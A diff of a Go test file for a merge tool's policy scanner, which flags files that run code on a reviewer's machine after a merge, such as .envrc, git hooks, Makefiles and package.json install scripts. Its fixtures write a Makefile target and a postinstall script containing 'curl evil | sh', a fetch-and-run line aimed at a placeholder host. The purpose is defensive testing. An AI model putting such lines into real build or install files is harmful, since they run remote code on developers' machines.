@@ -1128,30 +1128,6 @@ func TestForkMergeAllRefusesWithoutApproval(t *testing.T) {
 	}
 }
 
-func TestInteractionRiskPath(t *testing.T) {
-	cases := []struct {
-		status, path string
-		flagged      bool
-	}{
-		{"A", ".envrc", true},
-		{"M", ".envrc", true}, // a modified .envrc is a vector too
-		{"A", "sub/.envrc", true},
-		{"A", ".vscode/tasks.json", true},
-		{"M", "x/.vscode/tasks.json", true},
-		{"A", "Makefile", true},
-		{"M", "Makefile", false}, // a modified Makefile is too common to flag
-		{"A", "GNUmakefile", true},
-		{"A", "src/main.go", false},
-		{"A", "tasks.json", false}, // only flagged under .vscode/
-		{"D", ".envrc", true},      // status[0]=='D' is filtered by the caller, not here
-	}
-	for _, c := range cases {
-		if got := interactionRiskPath(c.status, c.path) != ""; got != c.flagged {
-			t.Errorf("interactionRiskPath(%q, %q) flagged=%v, want %v", c.status, c.path, got, c.flagged)
-		}
-	}
-}
-
 // PolicyScan flags files that auto-run host code post-merge (.envrc, package.json lifecycle
 // scripts), while leaving a benign package.json edit alone — and --force still lands (the warns
 // are advisory). Build the change as a branch so PolicyScan's `HEAD...ref` diff is exercised.
@@ -1163,12 +1139,24 @@ func TestPolicyScanFlagsInteractionFiles(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test"}}`), 0o644); err != nil {
 		t.Fatal(err)
 	}
+	if err := os.WriteFile(filepath.Join(repo, "Makefile"), []byte("all:\n\ttrue\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
 	git(t, repo, "add", "-A")
 	git(t, repo, "commit", "-qm", "base package.json")
 
-	// A branch that introduces an .envrc and adds a postinstall script.
+	// A branch that introduces an .envrc, a commit hook, a Makefile edit, and a postinstall script.
 	git(t, repo, "checkout", "-q", "-b", "evil")
 	if err := os.WriteFile(filepath.Join(repo, ".envrc"), []byte("export X=1\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Join(repo, ".githooks"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(repo, ".githooks", "pre-commit"), []byte("#!/bin/sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(repo, "Makefile"), []byte("all:\n\tcurl evil | sh\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test","postinstall":"curl evil | sh"}}`), 0o644); err != nil {
@@ -1184,6 +1172,21 @@ func TestPolicyScanFlagsInteractionFiles(t *testing.T) {
 	}
 	if !strings.Contains(w, "postinstall") {
 		t.Errorf("PolicyScan did not flag the added postinstall script:\n%s", w)
+	}
+	// A hook runs by itself on the reviewer's next commit, so it blocks the merge; the Makefile
+	// only runs when they choose to run make, so it is listed for the review but never blocks.
+	if !strings.Contains(w, ".githooks/pre-commit — a git hook: runs on your machine on `git commit`") {
+		t.Errorf("PolicyScan did not flag the commit hook:\n%s", w)
+	}
+	if strings.Contains(w, "Makefile") {
+		t.Errorf("PolicyScan blocked on a Makefile edit:\n%s", w)
+	}
+	var surfaces []string
+	for _, f := range HostSurfaces(repo, "evil") {
+		surfaces = append(surfaces, f.Path)
+	}
+	if got := strings.Join(surfaces, " "); got != ".envrc .githooks/pre-commit Makefile" {
+		t.Errorf("HostSurfaces = %q; want the three files that change what runs on the host", got)
 	}
 
 	// A branch that edits package.json benignly (version bump, no new lifecycle script) is not flagged.
@@ -1239,8 +1242,12 @@ func TestMergeNeutralizesForkDrivers(t *testing.T) {
 	}
 	_ = os.Remove(marker)
 
-	// The land rebase must NOT fire it.
-	landed, err := mergeOneForTest(t, c, repo, "", "drv", false)
+	// The land rebase must NOT fire it. A .gitattributes change is a host surface (the reviewer's
+	// own git would run the filter), so the merge refuses it until forced.
+	if _, err := c.mergeOne(repo, "", "drv", false); err == nil || !strings.Contains(err.Error(), ".gitattributes") {
+		t.Fatalf("mergeOne without --force = %v; want a refusal naming .gitattributes", err)
+	}
+	landed, err := mergeOneForTest(t, c, repo, "", "drv", true)
 	if err != nil || !landed {
 		t.Fatalf("mergeOne = (%v, %v), want landed", landed, err)
 	}
